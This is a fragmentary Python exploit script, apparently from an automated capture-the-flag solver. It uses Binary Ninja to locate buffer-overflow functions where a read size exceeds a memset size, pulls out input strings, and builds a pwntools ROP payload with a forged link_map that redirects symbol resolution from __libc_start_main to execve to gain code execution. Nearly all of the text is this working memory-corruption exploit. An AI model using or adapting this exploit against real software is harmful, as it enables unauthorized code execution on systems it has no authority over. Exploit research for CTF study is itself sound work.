    ...
    for i in custom:
        try:
            ...
            if read_size > memset_size:
                print("BOF FUNC FOUND", read_size, memset_size)
...
#First ones main, will call game
    ...
    for i in range(len(func_list) -1):
        if list(func_list[i].high_level_il.instructions)[7].operands[1].tokens[0].value == func_list[i+1].address_ranges[0].start:
            ...
            stringged = b''
            while b'\x00' not in stringged:
                stringged += bv.read(addr+ len(stringged),1)
            print(stringged)
            inputs.append(stringged)
...
# libc = ELF("./libc.so.6")
    ...
    rop = ROP(binary_name, checksec=False)
...
# offset_2_addr = libc.symbols.write - libc.symbols.read
    offset_2_addr = libc.symbols.execve - libc.symbols.__libc_start_main

    known_pointer = exe.got.__libc_start_main


    def make_link_map(fake_addr, reloc_index, offset_2_addr):
        """
        link_map 
            l_info 
    ...
    fake = make_link_map(fake_link_map_addr, 0, offset_2_addr)

# Point symtab to got -8
    fake += p32(6)
    fake += p32(known_pointer-4 )
...
# r_info = r_info // 0x10 
    ...
    payload += b'\x00' * ( fake_link_map_addr - fake_stack - len(payload))
    payload += fake
